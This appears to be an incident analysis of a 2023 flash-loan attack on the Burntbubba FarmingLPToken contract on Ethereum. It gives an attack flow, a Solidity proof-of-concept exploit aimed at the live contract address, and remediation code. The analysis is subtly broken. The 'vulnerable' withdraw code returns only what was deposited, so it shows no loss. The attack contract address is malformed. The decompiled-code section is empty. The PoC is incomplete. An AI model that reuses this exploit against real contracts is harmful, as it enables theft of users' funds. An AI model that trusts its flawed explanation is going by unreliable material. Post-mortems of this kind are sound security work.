# Burntbubba FarmingLPToken Emergency Withdraw Attack Incident Analysis

## 1. Overview

| Item | Details |
|------|---------|
| Project | Burntbubba (FarmingLPToken) |
| Date | 2023-11-06 |
| Chain | Ethereum Mainnet |
| Loss | ~$3,000 USD |
| Attack Type | Flash Loan + LP Liquidity Manipulation + emergencyWithdraw() |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x9d44f1a37044500064111010632a8a59003701c8` |
| Attack Contract | `0x4bc691601b50b3e107b89d5eb0ce3606eb48` |
| Vulnerable Contract | `0xa44e79a2c9a8965e7a6fa77bf0ca8faf50e6c73e` (FarmingLPToken) |
| Fork Block | 18,680,254 |

## 2. Vulnerability Code Analysis

FarmingLPToken is a farming contract that stakes LP tokens, where the `emergencyWithdraw()` function returned staked LP tokens without validation. The attacker obtained liquidity via nested flash loans from Balancer and SushiSwap, manipulated the LP, and executed an over-withdrawal by calling `emergencyWithdraw()` after `deposit()`.

```solidity
// Vulnerable pattern: insufficient emergencyWithdraw validation
contract FarmingLPToken {
    mapping(address => uint256) public stakedAmount;
    IERC20 public lpToken;

    function deposit(uint256 amount) external {
        lpToken.transferFrom(msg.sender, address(this), amount);
        stakedAmount[msg.sender] += amount;
    }

    // Vulnerable: withdraws at current LP value without validating LP value at time of staking
    function emergencyWithdraw() external {
        uint256 amount = stakedAmount[msg.sender];
        stakedAmount[msg.sender] = 0;
        // Returns LP tokens — callable after inflating LP value via liquidity manipulation
        lpToken.transfer(msg.sender, amount);
    }
}
```

**Vulnerability**: `emergencyWithdraw()` only checks the quantity of staked LP tokens and does not validate the intrinsic value of the LP tokens. The attacker added liquidity via flash loans to temporarily inflate the LP value, then executed `deposit()` → `emergencyWithdraw()` to extract excess assets.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + LP Liquidity Manipulation + emergencyWithdraw()
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x9d44f1a37044500064111010632a8a59003701c8]
  │
  ├─1─▶ Balancer.flashLoan(tokens, amounts)
  │      [Balancer Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8]
  │      Borrow large-scale liquidity
  │
  ├─2─▶ SushiSwap.flashLoan() (nested)
  │      Obtain additional liquidity
  │
  ├─3─▶ SushiRouter.addLiquidity() × 3
  │      [SushiRouter: SushiSwap V2]
  │      Mint LP tokens and inflate their value
  │
  ├─4─▶ FarmingLPToken.deposit(lpAmount)
  │      [FarmingLPToken: 0xa44e79a2c9a8965e7a6fa77bf0ca8faf50e6c73e]
  │      Stake inflated LP tokens
  │
  ├─5─▶ FarmingLPToken.emergencyWithdraw()
  │      Request return of staked LP
  │      → LP returned without intrinsic value validation
  │
  ├─6─▶ SushiRouter.burn() - Recover tokens by burning LP
  │      Recover tokens from received LP
  │
  ├─7─▶ SushiRouter.swapTokensForExactTokens()
  │      Swap held tokens into profit tokens
  │
  └─8─▶ Repay nested flash loans sequentially + realize ~$3,000 profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IFarmingLPToken {
    function deposit(uint256 amount) external;
    function emergencyWithdraw() external;
    function stakedAmount(address user) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

contract BurntbubbaExploit {
    IFarmingLPToken farming = IFarmingLPToken(0xa44e79a2c9a8965e7a6fa77bf0ca8faf50e6c73e);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ISushiRouter sushiRouter;
    IERC20 lpToken;

    function testExploit() external {
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        // Borrow large-scale tokens
        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        // SushiSwap nested flash loan
        // Inflate LP value via addLiquidity x3
        for (uint i = 0; i < 3; i++) {
            sushiRouter.addLiquidity(
                tokens[0], tokens[1],
                amounts[0] / 3, amounts[1] / 3,
                0, 0, address(this), block.timestamp
            );
        }

        // Deposit with inflated LP
        uint256 lpBalance = lpToken.balanceOf(address(this));
        lpToken.approve(address(farming), lpBalance);
        farming.deposit(lpBalance);

        // Over-withdraw via emergencyWithdraw
        farming.emergencyWithdraw();

        // Recover tokens by burning LP
        uint256 lpAfter = lpToken.balanceOf(address(this));
        lpToken.transfer(address(lpToken), lpAfter);
        // Call burn() etc. to recover underlying tokens

        // Repay Balancer
        for (uint i = 0; i < tokens.length; i++) {
            IERC20(tokens[i]).transfer(address(balancer), amounts[i] + feeAmounts[i]);
        }
    }
}
```

## 5. Vulnerability Classification

| Item | Details |
|------|---------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | No LP value validation in emergencyWithdraw(), flash loan LP manipulation |
| Impact Scope | FarmingLPToken staking pool |
| Explorer | [Etherscan](https://etherscan.io/address/0xa44e79a2c9a8965e7a6fa77bf0ca8faf50e6c73e) |

## 6. Security Recommendations

```solidity
// Fix 1: Separate deposit block and withdrawal block
mapping(address => uint256) public depositBlock;

function deposit(uint256 amount) external {
    depositBlock[msg.sender] = block.number;
    // ...
}

function emergencyWithdraw() external {
    require(block.number > depositBlock[msg.sender], "Cannot withdraw in deposit block");
    // ...
}

// Fix 2: Enforce minimum staking duration
mapping(address => uint256) public depositTimestamp;
uint256 public constant MIN_STAKE_DURATION = 1 days;

function emergencyWithdraw() external {
    require(
        block.timestamp >= depositTimestamp[msg.sender] + MIN_STAKE_DURATION,
        "Too early to withdraw"
    );
    // ...
}

// Fix 3: Snapshot-based validation using LP token underlying value
mapping(address => uint256) public depositedUnderlying;

function deposit(uint256 lpAmount) external {
    // Snapshot underlying asset value at time of deposit
    (uint256 underlying0, uint256 underlying1) = getUnderlyingValue(lpAmount);
    depositedUnderlying[msg.sender] = underlying0 + underlying1;
    // ...
}
```

## 7. Lessons Learned

1. **emergencyWithdraw Security**: Emergency withdrawal functions require stricter validation than normal withdrawal functions. Attacks that exploit the difference in LP value between the time of staking and the time of withdrawal must be considered.
2. **LP Token Farming Vulnerability**: Farming contracts that stake LP tokens are vulnerable to a pattern where an attacker temporarily manipulates LP value via flash loans before depositing and withdrawing. Blocking same-block deposit/withdrawal is the baseline defense.
3. **Nested Flash Loans**: Nested flash loans combining Balancer and SushiSwap are leveraged even for small-scale attacks. It is notable that a sophisticated flash loan structure was used even for an attack of only $3K.
4. **Auditing Small-Scale Farming Contracts**: Even small farming contracts require security audits covering the interaction between `emergencyWithdraw()` and `deposit()` functions.